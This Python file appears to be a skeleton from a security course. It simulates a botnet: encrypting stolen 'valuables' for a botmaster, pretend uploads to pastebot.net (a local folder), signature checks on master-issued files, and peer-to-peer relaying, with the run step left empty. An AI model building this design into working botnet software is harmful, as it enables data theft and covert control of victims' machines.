import os
from Crypto.Signature import PKCS1_PSS
from Crypto.Hash import SHA384
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Encryption key
encryption_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJaeX+
EdvX3omyJDM8KmXMuOZFTrkwSRse8NENc7Jjygz/KbmyeGPa+GdKlGWAuO4Waxz7
Wu5KjVNz/TTXdGT4vJLBLJtc7pX+3X5yhmK1aF/3K7YJqP2DDkTFJW3ESjfLU/yG
c5wtjMaRpGG6FPCmU7ybcLLKp4JJQ1a+AonX2vsL2VAsEbTWa7ZYhZdrv7S56pSo
rrcmlDdfLS+mExte4OtRFoGaozPvwsJr7SJI5e1LsqcuD1crVv2vChG26Czsiy7W
ffioat1z+ifJzY4p+JESM6yUT2UeK0L0abrSKmdKQvqA30rZCHkI7pNRQoSxg8yi
aKjQT31RoykUcLypX3zKIzk5tp+56GohvEocLpHs9ajwZhboq20Nr8SQQuV4338w
pPx04tKaI6KLvtlpwjBdx/KC63mMYhOPpxqx4lhLQz3VSuUF3OPviqmjnhBQTWu5
h6VO8otAgo8IMPssOv749HKYGt96KNUVu27eDnoshMlruWVf8PoFx+bNnlE="""

# Verification key
verification_key = """ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuye
KgSi2VASP/7ypkEaeBwRJIKj/H/GAsODiXDkKJW8RZ+2HSlOaU2uwCXCF1+hkfUe
Ia+qpkNrt0PTZz/7QAABx/xh6pxIbC0B3wtw7cOPmE2fpmoLxRqyQLlMQqIAUnUp
zMPAs4JPy+wVsEgqftZU+eshEWPx5VUk03P5csTdNdVVS5reepMwRamb+bI3FZbJ
xpX7YcLwmUgQ9mGj0vaYh4XNpJlvZSbmLHUGWzTp+9lptixIoxf+4ElZ3cYF+UNl
c5+QkzWHjsrWZrkrABnFdig2D9x29xVDlEEq3aBJEnhBeAcVwvn7+XaPHg6x7QRr
3BIea8yHihlodqaDvYeOKQ7ctoHa/nyV+JQAbAok2fKD0I4FyD8GrEcwpL1lZdKo
5KAGGnCUNCTlWW1/Y9b7tPfm+52IKcWKYfifCK4bb3HJEMJaLnw9evKCjLUNBgF7
+E9I+OAqqQBCparDswDvyievYU9RuozUD39eR+G830jgR8TYXLLq3PZTqnTnU="""

# Instead of storing files on disk,
# we'll save them in memory for simplicity
filestore = {}

# Valuable data to be sent to the botmaster
valuables = []

###

def save_valuable(data):
    valuables.append(data)

def encrypt_for_master(data):
    # Encrypt the file using the RSAES-OAEP encryption scheme of PKCS 1
    # with a 3072-bit public key generated by ssh
    # Only the bot master can read them as only the bot master has the private key
    key = RSA.importKey(encryption_key)
    cipher = PKCS1_OAEP.new(key)
    encrypted_data = cipher.encrypt(data)
    return encrypted_data

def upload_valuables_to_pastebot(fn):
    # Encrypt the valuables using the RSAES-OAEP encryption scheme of PKCS 1
    # with a 3072-bit public key generated by ssh
    # Only the bot master can read them as only the bot master has the private key
    valuable_data = "\n".join(valuables)
    valuable_data = bytes(valuable_data, "ascii")
    encrypted_master = encrypt_for_master(valuable_data)

    # "Upload" it to pastebot (i.e. save in pastebot folder)
    f = open(os.path.join("pastebot.net", fn), "wb")
    f.write(encrypted_master)
    f.close()

    # Print a confirmation message
    print("Saved valuables to pastebot.net/%s for the botnet master" % fn)

###

def verify_file(f):
    # Split off the first line of the file and verifies that it is an integer
    lines = f.split(bytes("\n", "ascii"), 1)
    first_line = lines.pop(0)
    f = bytes("\n", "ascii").join(lines)
    try:
        size = int(first_line)
    except ValueError:
        return False

    # Hash the file content but not the signature itself
    h = SHA384.new()
    h.update(f[:size])
    
    # The file is signed with the RSASSA-PSS signature scheme of PKCS 1
    # with a 3072-bit private key generated by ssh
    # Verify that the signature is valid for the file using the public key
    key = RSA.importKey(verification_key)
    verifier = PKCS1_PSS.new(key)
    if verifier.verify(h, f[size:]):
        return True
    return False

def process_file(fn, f):
    if verify_file(f):
        # If it was, store it unmodified
        # (so it can be sent to other bots)
        # Decrypt and run the file
        filestore[fn] = f
        print("Stored the received file as %s" % fn)
    else:
        print("The file has not been signed by the botnet master")

def download_from_pastebot(fn):
    # "Download" the file from pastebot.net
    # (i.e. pretend we are and grab it from disk)
    # Open the file as bytes and load into memory
    if not os.path.exists(os.path.join("pastebot.net", fn)):
        print("The given file doesn't exist on pastebot.net")
        return
    f = open(os.path.join("pastebot.net", fn), "rb").read()
    process_file(fn, f)

def p2p_download_file(sconn):
    # Download the file from the other bot
    fn = str(sconn.recv(), "ascii")
    f = sconn.recv()
    print("Receiving %s via P2P" % fn)
    process_file(fn, f)

###

def p2p_upload_file(sconn, fn):
    # Grab the file and upload it to the other bot
    # Only files signed by the bot master are accepted
    if fn not in filestore:
        print("That file doesn't exist in the botnet's filestore")
        return
    print("Sending %s via P2P" % fn)
    sconn.send(fn)
    sconn.send(filestore[fn])

def run_file(f):
    # If the file can be run,
    # run the commands
    pass
